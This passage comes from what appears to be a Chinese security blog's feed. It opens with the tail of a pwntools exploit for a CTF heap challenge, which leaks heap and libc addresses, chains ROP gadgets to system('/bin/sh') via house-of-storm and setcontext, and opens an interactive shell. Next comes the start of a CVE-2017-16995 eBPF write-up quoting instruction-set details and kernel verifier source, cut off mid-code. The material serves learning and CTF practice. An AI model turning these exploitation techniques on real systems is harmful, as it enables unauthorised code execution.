class="string">&#x27;utf8&#x27;</span>))</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;What do you want to input?&#x27;</span>)</span><br><span class="line">    r.send(data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">idx</span>):</span></span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;Your choice?&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;Which one do you want to see?&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">bytes</span>(<span class="built_in">str</span>(idx), encoding=<span class="string">&#x27;utf8&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">create(<span class="number">0x510</span>)</span><br><span class="line">create(<span class="number">0x100</span>)</span><br><span class="line">create(<span class="number">0x500</span>)</span><br><span class="line">create(<span class="number">0x100</span>)</span><br><span class="line">create(<span class="number">0x200</span>)</span><br><span class="line">create(<span class="number">0x100</span>)</span><br><span class="line">create(<span class="number">0x200</span>)</span><br><span class="line">create(<span class="number">0x100</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line">delete(<span class="number">6</span>)</span><br><span class="line">show(<span class="number">6</span>)</span><br><span class="line"></span><br><span class="line">r.recvline()</span><br><span class="line">heap_base = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0xc50</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(heap_base))</span><br><span class="line"></span><br><span class="line">delete(<span class="number">7</span>)</span><br><span class="line">delete(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">r.recvline()</span><br><span class="line">libc_base = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x39bb78</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">pop_rdi = libc_base + <span class="built_in">next</span>(libc.search(asm(<span class="string">&#x27;pop rdi\nret&#x27;</span>)))</span><br><span class="line">system = libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh = libc_base+<span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line"></span><br><span class="line">edit(<span class="number">1</span>, flat(pop_rdi, bin_sh, system))</span><br><span class="line"></span><br><span class="line">create(<span class="number">0x600</span>)</span><br><span class="line"><span class="comment"># gdb.attach(r)</span></span><br><span class="line">edit(<span class="number">0</span>, flat([libc_base+<span class="number">0x39bfa8</span>]*<span class="number">2</span>, <span class="number">0</span>, libc_base +</span><br><span class="line">     <span class="number">0x39c6f8</span>-<span class="number">0x20</span>, <span class="number">0</span>, libc_base+<span class="number">0x734f0</span>)+<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line"><span class="comment"># gdb.attach(r, &#x27;b*$rebase(0xC17)\nb*&#x27;+hex(libc_base+0x45226))</span></span><br><span class="line"><span class="comment"># gdb.attach(r, &#x27;b*$rebase(0xE10)&#x27;)</span></span><br><span class="line">edit(<span class="number">2</span>, flat([libc_base+<span class="number">0x39bb78</span>]*<span class="number">2</span>,</span><br><span class="line">     [libc_base + <span class="number">0x45226</span>]*<span class="number">3</span>, libc_base+<span class="number">0x734f0</span>)+<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">create(<span class="number">0x600</span>)</span><br><span class="line"><span class="comment"># gdb.attach(r, &#x27;b*$rebase(0xE10)\nc&#x27;)</span></span><br><span class="line"><span class="comment"># edit(2, flat([libc_base+0x3c4b78]*2, [libc_base +</span></span><br><span class="line"><span class="comment">#      libc.symbols[&#x27;setcontext&#x27;]+53]*3, libc_base+0x6d99a))</span></span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">r.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">r.sendline(<span class="built_in">bytes</span>(<span class="built_in">str</span>(<span class="number">0</span>), encoding=<span class="string">&#x27;utf8&#x27;</span>))</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">payload = flat([libc_base + libc.symbols[<span class="string">&#x27;setcontext&#x27;</span>]+<span class="number">53</span>]</span><br><span class="line">               * <span class="number">5</span>, libc_base+<span class="number">0x65bca</span>)</span><br><span class="line">payload = payload.ljust(<span class="number">0xa0</span>-<span class="number">0x10</span>, <span class="string">b&#x27;a&#x27;</span>) + \</span><br><span class="line">    flat(heap_base+<span class="number">0x520</span>, libc_base+<span class="number">0x205c2</span>)</span><br><span class="line">r.send(payload)</span><br><span class="line"><span class="comment"># edit(0, flat([libc_base+0x45226]*5, libc_base+0x7c990))</span></span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>这么多天做星盟的题会发现题目质量非常之高，需要对程序的运行，sandbox绕过机制，shellcode的熟练编写以及在堆题中找适合的gadget，有深刻的理解才可以完成解题。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;练题笔记&quot;&gt;&lt;a href=&quot;#练题笔记&quot; class=&quot;headerlink&quot; title=&quot;练题笔记&quot;&gt;&lt;/a&gt;练题笔记&lt;/h2&gt;&lt;p&gt;已经学了一段时间内核了，感觉自己在基础知识方面比较欠缺，所以打算回过头去看一下相关书籍深入学习一下基础知识，在学习途中保持p</summary>
      
    
    
    
    
    <category term="sandbox" scheme="https://cv196082.gitee.io/tags/sandbox/"/>
    
    <category term="shellcode" scheme="https://cv196082.gitee.io/tags/shellcode/"/>
    
    <category term="__libc_start_main" scheme="https://cv196082.gitee.io/tags/libc-start-main/"/>
    
    <category term="house of storm" scheme="https://cv196082.gitee.io/tags/house-of-storm/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2017-16995</title>
    <link href="https://cv196082.gitee.io/2022/10/10/CVE-2017-16995/"/>
    <id>https://cv196082.gitee.io/2022/10/10/CVE-2017-16995/</id>
    <published>2022-10-10T09:07:38.000Z</published>
    <updated>2022-11-22T09:04:51.963Z</updated>
    
    <content type="html"><![CDATA[<p>这一篇是作为ebpf的入门文章，所以会稍微介绍一下指令集，寄存器。可能篇幅略长。</p><h2 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h2><p>该漏洞最早是由17年12月21号Google Project Zero团队的Jann Horn发现并报告的，编号为CVE-2017-16995。<br><strong>内核影响版本：</strong>Linux Kernel Version 4.14 ~ 4.4 。</p><h2 id="eBPF指令集介绍"><a href="#eBPF指令集介绍" class="headerlink" title="eBPF指令集介绍"></a>eBPF指令集介绍</h2><p>在认识一个新的指令集的第一步就是认识寄存器，在eBPF中存在十一个寄存器：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">R0：一般用来表示函数返回值，包括整个 BPF 代码块（其实也可被看做一个函数）的返回值；</span><br><span class="line">R1~R5：一般用于表示内核预设函数的参数；</span><br><span class="line">R6~R9：在 BPF 代码中可以作存储用，其值不受内核预设函数影响；</span><br><span class="line">R10：只读，用作栈指针(SP)</span><br><span class="line">可理解对应为物理寄存器为：</span><br><span class="line">R0 – rax</span><br><span class="line">    R1 - rdi</span><br><span class="line">    R2 - rsi</span><br><span class="line">    R3 - rdx</span><br><span class="line">    R4 - rcx</span><br><span class="line">    R5 - r8</span><br><span class="line">    R6 - rbx</span><br><span class="line">    R7 - r13</span><br><span class="line">    R8 - r14</span><br><span class="line">    R9 - r15</span><br><span class="line">    R10 – rbp</span><br></pre></td></tr></table></figure><p>对于算数(ALU)和跳转(JMP)指令，8bit的代码字段分为三个部分：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">+----------------+--------+--------------------+</span><br><span class="line">|   4 bits       |  1 bit |   3 bits           |</span><br><span class="line">| operation code | source | instruction class  |</span><br><span class="line">+----------------+--------+--------------------+</span><br><span class="line">(MSB)                                      (LSB)</span><br></pre></td></tr></table></figure><p>这里最后3bit LSB代表指令类型：    </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">eBPF classes:</span><br><span class="line"></span><br><span class="line"> BPF_LD    <span class="number">0x00</span></span><br><span class="line"> BPF_LDX   <span class="number">0x01</span></span><br><span class="line"> BPF_ST    <span class="number">0x02</span></span><br><span class="line"> BPF_STX   <span class="number">0x03</span></span><br><span class="line"> BPF_ALU   <span class="number">0x04</span></span><br><span class="line"> BPF_JMP   <span class="number">0x05</span></span><br><span class="line"> BPF_JMP32 <span class="number">0x06</span></span><br><span class="line"> BPF_ALU64 <span class="number">0x07</span></span><br></pre></td></tr></table></figure><p>当<code>BPF_CLASS(code) == BPF_ALU or BPF_JMP</code>时,第四bit编码源操作数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">BPF_K     <span class="number">0x00</span> ；代表将立即数作为源操作数</span><br><span class="line">BPF_X     <span class="number">0x08</span> ；代表将‘src_reg’作为源操作数</span><br></pre></td></tr></table></figure><p>前4bit的MSB用来存储操作码：</p><ol><li>如果 BPF_CLASS(code) == BPF_ALU or BPF_ALU64时，操作码会是下面的一个：</li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">BPF_ADD   <span class="number">0x00</span></span><br><span class="line">BPF_SUB   <span class="number">0x10</span></span><br><span class="line">BPF_MUL   <span class="number">0x20</span></span><br><span class="line">BPF_DIV   <span class="number">0x30</span></span><br><span class="line">BPF_OR    <span class="number">0x40</span></span><br><span class="line">BPF_AND   <span class="number">0x50</span></span><br><span class="line">BPF_LSH   <span class="number">0x60</span></span><br><span class="line">BPF_RSH   <span class="number">0x70</span></span><br><span class="line">BPF_NEG   <span class="number">0x80</span></span><br><span class="line">BPF_MOD   <span class="number">0x90</span></span><br><span class="line">BPF_XOR   <span class="number">0xa0</span></span><br><span class="line">BPF_MOV   <span class="number">0xb0</span>  <span class="comment">/* eBPF only: mov reg to reg */</span></span><br><span class="line">BPF_ARSH  <span class="number">0xc0</span>  <span class="comment">/* eBPF only: sign extending shift right */</span></span><br><span class="line">BPF_END   <span class="number">0xd0</span>  <span class="comment">/* eBPF only: endianness conversion */</span></span><br></pre></td></tr></table></figure><ol start="2"><li>如果BPF_CLASS(code) == BPF_JMP or BPF_JMP32时，操作码将会是下面的一个：</li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">BPF_JA    <span class="number">0x00</span>  <span class="comment">/* BPF_JMP only */</span></span><br><span class="line">BPF_JEQ   <span class="number">0x10</span></span><br><span class="line">BPF_JGT   <span class="number">0x20</span></span><br><span class="line">BPF_JGE   <span class="number">0x30</span></span><br><span class="line">BPF_JSET  <span class="number">0x40</span></span><br><span class="line">BPF_JNE   <span class="number">0x50</span>  <span class="comment">/* eBPF only: jump != */</span></span><br><span class="line">BPF_JSGT  <span class="number">0x60</span>  <span class="comment">/* eBPF only: signed &#x27;&gt;&#x27; */</span></span><br><span class="line">BPF_JSGE  <span class="number">0x70</span>  <span class="comment">/* eBPF only: signed &#x27;&gt;=&#x27; */</span></span><br><span class="line">BPF_CALL  <span class="number">0x80</span>  <span class="comment">/* eBPF BPF_JMP only: function call */</span></span><br><span class="line">BPF_EXIT  <span class="number">0x90</span>  <span class="comment">/* eBPF BPF_JMP only: function return */</span></span><br><span class="line">BPF_JLT   <span class="number">0xa0</span>  <span class="comment">/* eBPF only: unsigned &#x27;&lt;&#x27; */</span></span><br><span class="line">BPF_JLE   <span class="number">0xb0</span>  <span class="comment">/* eBPF only: unsigned &#x27;&lt;=&#x27; */</span></span><br><span class="line">BPF_JSLT  <span class="number">0xc0</span>  <span class="comment">/* eBPF only: signed &#x27;&lt;&#x27; */</span></span><br><span class="line">BPF_JSLE  <span class="number">0xd0</span>  <span class="comment">/* eBPF only: signed &#x27;&lt;=&#x27; */</span></span><br></pre></td></tr></table></figure><p>比如 <code>BPF_ADD | BPF_X | BPF_ALU</code>这条指令代表32位加法运算，将源寄存器的值加上目的寄存器的值，然后将结果存储到目的寄存器中：<code>dst_reg = (u32) dst_reg + (u32) src_reg;</code></p><p>并且，在eBPF指令集中没有了BPF_RET指令，用<code>BPF_JMP | BPF_EXIT</code>仅代替函数执行完退出，在函数退出之前，eBPF需要将返回值存储在R0中。</p><p>对于加载（LOAD）和存储(STORE)指令，8-bit的代码域分为：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">+--------+--------+-------------------+</span><br><span class="line">| <span class="number">3</span> bits | <span class="number">2</span> bits |   <span class="number">3</span> bits          |</span><br><span class="line">|  mode  |  size  | instruction <span class="class"><span class="keyword">class</span> |</span></span><br><span class="line"><span class="class">+--------+--------+-------------------+</span></span><br><span class="line"><span class="class">(<span class="title">MSB</span>)                             (<span class="title">LSB</span>)</span></span><br></pre></td></tr></table></figure><p>其中size分别有下面四种类型：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">BPF_W   <span class="number">0x00</span>   ; word <span class="number">4</span> byte</span><br><span class="line">BPF_H   <span class="number">0x08</span>   ; half word <span class="number">2</span> byte</span><br><span class="line">BPF_B   <span class="number">0x10</span>   ; byte </span><br><span class="line">BPF_DW  <span class="number">0x18</span>   ; <span class="keyword">double</span> word <span class="number">8</span> byte</span><br></pre></td></tr></table></figure><p>并且在内核中，每一条指令的信息都储存在bpf_insn结构体中：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bpf_insn</span> &#123;</span></span><br><span class="line">    __u8    code;       <span class="comment">/* opcode */</span></span><br><span class="line">    __u8    dst_reg:<span class="number">4</span>;  <span class="comment">/* dest register */</span></span><br><span class="line">    __u8    src_reg:<span class="number">4</span>;  <span class="comment">/* source register */</span></span><br><span class="line">    __s16   off;        <span class="comment">/* signed offset */</span></span><br><span class="line">    __s32   imm;        <span class="comment">/* signed immediate constant */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="eBPF代码加载执行流程-amp-检查分析"><a href="#eBPF代码加载执行流程-amp-检查分析" class="headerlink" title="eBPF代码加载执行流程 &amp; 检查分析"></a>eBPF代码加载执行流程 &amp; 检查分析</h2><h3 id="加载执行流程"><a href="#加载执行流程" class="headerlink" title="加载执行流程"></a>加载执行流程</h3><p>用户可以用eBPF指令字节码的形式向内核输送代码，并通过事件来（如往socket写数据）来触发内核执行用户提供的eBPF代码。eBPF模块可以让用户加载数据包过滤代码（eBPF代码）进入内核，在收到数据包时触发eBPF代码执行。可以编写一个简单的用户数据包过滤程序来触发执行eBPF代码，具体流程如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">* syscall(__NR_bpf, BPF_MAP_CREATE, &amp;attr, <span class="keyword">sizeof</span>(attr)) ；创建全局变量<span class="built_in">map</span>结构体，内核态用户态都可以访问。</span><br><span class="line">* syscall(__NR_bpf, BPF_PROG_LOAD, &amp;attr, <span class="keyword">sizeof</span>(attr)) ；将用户态的BPF代码注入到内核，并对代码进行检查，并模拟执行。</span><br><span class="line">    * <span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">bpf_prog_load</span><span class="params">(<span class="keyword">union</span> bpf_attr *attr)</span> ；判断过滤模式</span></span><br><span class="line"><span class="function">        * <span class="keyword">int</span> <span class="title">bpf_check</span><span class="params">(struct bpf_prog **prog, <span class="keyword">union</span> bpf_attr *attr)</span></span></span><br><span class="line"><span class="function">            * <span class="title">check_cfg</span><span class="params">(env)</span></span>; 第一轮检查，检查是否存在环路</span><br><span class="line">            * do_check(env);  第二轮检查，详细扫描BPF代码的运行过程，跟踪分析寄存器和堆栈，检查是否有不符合规则的情况出现</span><br><span class="line">    * <span class="keyword">static</span> <span class="keyword">unsigned</span> <span class="keyword">int</span> __bpf_prog_run(<span class="keyword">void</span> *ctx, <span class="keyword">const</span> struct bpf_insn *insn)；运行BPF指令，最后真正运行的的函数。</span><br><span class="line">* setsockopt(sockets[<span class="number">1</span>], SOL_SOCKET, SO_ATTACH_BPF, &amp;progfd, <span class="keyword">sizeof</span>(progfd))；将eBPF与特定的事件绑定，在收到数据包时触发eBPF代码执行。</span><br></pre></td></tr></table></figure><h3 id="检查分析"><a href="#检查分析" class="headerlink" title="检查分析"></a>检查分析</h3><p>根据上述流程我们可以看到我们将BPF代码注入到内核中是发生在第二步中的，执行的函数为：<code>bpf_prog_load</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">bpf_prog_load</span><span class="params">(<span class="keyword">union</span> bpf_attr *attr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="class"><span class="keyword">enum</span> <span class="title">bpf_prog_type</span> <span class="title">type</span> =</span> attr-&gt;prog_type;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">bpf_prog</span> *<span class="title">prog</span>;</span></span><br><span class="line">  <span class="keyword">int</span> err;</span><br><span class="line">  <span class="keyword">char</span> license[<span class="number">128</span>];</span><br><span class="line">  <span class="keyword">bool</span> is_gpl;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (CHECK_ATTR(BPF_PROG_LOAD))</span><br><span class="line">    <span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* copy eBPF program license from user space */</span></span><br><span class="line">  <span class="keyword">if</span> (strncpy_from_user(license, u64_to_ptr(attr-&gt;license),</span><br><span class="line">                        <span class="keyword">sizeof</span>(license) - <span class="number">1</span>) &lt; <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> -EFAULT;</span><br><span class="line">  license[<span class="keyword">sizeof</span>(license) - <span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* eBPF programs must be GPL compatible to use GPL-ed functions */</span></span><br><span class="line">  is_gpl = license_is_gpl_compatible(license);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (attr-&gt;insn_cnt &gt;= BPF_MAXINSNS)</span><br><span class="line">    <span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (type == BPF_PROG_TYPE_KPROBE &amp;&amp;</span><br><span class="line">      attr-&gt;kern_version != LINUX_VERSION_CODE)</span><br><span class="line">    <span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (type != BPF_PROG_TYPE_SOCKET_FILTER &amp;&amp; !capable(CAP_SYS_ADMIN))</span><br><span class="line">    <span class="keyword">return</span> -EPERM;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* plain bpf_prog allocation */</span></span><br><span class="line">  prog = bpf_prog_alloc(bpf_prog_size(attr-&gt;insn_cnt), GFP_USER);</span><br><span class="line">  <span class="keyword">if</span> (!prog)</span><br><span class="line">    <span class="keyword">return</span> -ENOMEM;</span><br><span class="line"></span><br><span class="line">  err = bpf_prog_charge_memlock(prog);</span><br><span class="line">  <span class="keyword">if</span> (err)</span><br><span class="line">    <span class="keyword">goto</span> free_prog_nouncharge;</span><br><span class="line"></span><br><span class="line">  prog-&gt;len = attr-&gt;insn_cnt;</span><br><span class="line"></span><br><span class="line">  err = -EFAULT;</span><br><span class="line">  <span class="keyword">if</span> (copy_from_user(prog-&gt;insns, u64_to_ptr(attr-&gt;insns),</span><br><span class="line">                     prog-&gt;len * <span class="keyword">sizeof</span>(struct bpf_insn)) != <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">goto</span> free_prog;</span><br><span class="line"></span><br><span class="line">  prog-&gt;orig_prog = <span class="literal">NULL</span>;</span><br><span class="line">  prog-&gt;jited = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  atomic_set(&amp;prog-&gt;aux-&gt;refcnt, <span class="number">1</span>);</span><br><span class="line">  prog-&gt;gpl_compatible = is_gpl ? <span class="number">1</span> : <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* find program type: socket_filter vs tracing_filter */</span></span><br><span class="line">  err = find_prog_type(type, prog);</span><br><span class="line">  <span class="keyword">if</span> (err &lt; <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">goto</span> free_prog;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* run eBPF verifier */</span></span><br><span class="line">  err = bpf_check(&amp;prog, attr);</span><br><span class="line">  <span class="keyword">if</span> (err &lt; <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">goto</span> free_used_maps;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* fixup BPF_CALL-&gt;imm field */</span></span><br><span class="line">  fixup_bpf_calls(prog);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* eBPF program is ready to be JITed */</span></span><br><span class="line">  err = bpf_prog_select_runtime(prog);</span><br><span class="line">  <span class="keyword">if</span> (err &lt; <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">goto</span> free_used_maps;</span><br><span class="line"></span><br><span class="line">  err = bpf_prog_new_fd(prog);</span><br><span class="line">  <span class="keyword">if</span> (err &lt; <span class="number">0</span>)</span><br><span class="line">    <span class="comment">/* failed to allocate fd */</span></span><br><span class="line">    <span class="keyword">goto</span> free_used_maps;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> err;</span><br><span class="line"></span><br><span class="line">  free_used_maps:</span><br><span class="line">  free_used_maps(prog-&gt;aux);</span><br><span class="line">  free_prog:</span><br><span class="line">  bpf_prog_uncharge_memlock(prog);</span><br><span class="line">  free_prog_nouncharge:</span><br><span class="line">  bpf_prog_free(prog);</span><br><span class="line">  <span class="keyword">return</span> err;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到在19行对ebpf license进行验证是否为GPL证书的一种，在21行检验了传入代码的长度，然后通过<code>find_prog_type</code>函数判断过滤模式，其中socket_filter是数据包过滤，而tracing_filter就是对系统调用号及参数的过滤，也就是我们常见的seccomp。最后进入<code>bpf_check</code>函数进行进一步验证。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">bpf_check</span><span class="params">(struct bpf_prog **prog, <span class="keyword">union</span> bpf_attr *attr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> __user *log_ubuf = <span class="literal">NULL</span>;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">verifier_env</span> *<span class="title">env</span>;</span></span><br><span class="line">  <span class="keyword">int</span> ret = -EINVAL;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ((*prog)-&gt;len &lt;= <span class="number">0</span> || (*prog)-&gt;len &gt; BPF_MAXINSNS)</span><br><span class="line">    <span class="keyword">return</span> -E2BIG;</span><br><span 